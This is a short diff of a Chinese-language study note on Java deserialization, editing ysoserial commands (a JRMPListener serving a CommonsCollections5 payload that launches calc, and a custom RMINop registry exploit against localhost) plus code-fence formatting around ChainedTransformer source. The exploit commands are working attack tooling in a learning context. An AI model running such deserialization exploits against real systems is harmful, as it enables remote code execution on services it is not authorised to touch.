@@ -539,8 +539,9 @@ LDAP：
   java -cp ysoserial.jar ysoserial.exploit.JRMPListener 23333 CommonsCollections5 calc
   
   // RMINop是我自己改了RMIRegistryExploit，直接bind，不要封装Proxy
-  java -cp ysoserial.jar ysoserial.exploit.RMINop 127.0.0.1 9999 JRMPClient 127.0.0.1:23333
-```
+  java -cp ysoserial.jar ysoserial.exploit.RMINop 127.0.0.1 9999 JRMPClient 127.0.0.1:2333
+  ```
+
   
   PowerShell直接重定向的话，由于默认UTF16编码，序列化数据魔数会出错，Windows10 1903上使用cmd没问题
 
@@ -584,7 +585,7 @@ public static void main(String[] args) {
 
 `cc.functors.ChainedTransformer`可以实现对一个Transformer数组里的Transformer的链式调用，`output | input`
 
-```java
+​```java
 public Object transform(Object object) {
     for (int i = 0; i < iTransformers.length; i++) {
         object = iTransformers[i].transform(object);
